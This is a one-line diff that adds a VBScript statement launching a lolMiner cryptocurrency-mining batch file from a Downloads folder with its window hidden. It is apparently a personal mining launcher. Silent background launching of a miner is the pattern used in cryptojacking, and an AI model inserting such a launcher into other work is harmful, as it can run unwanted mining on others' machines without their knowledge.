@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "C:\Users\Lenovo\Downloads\lolMiner_v1.32a_Win64\1.32a\mine_zcl.bat",0,True
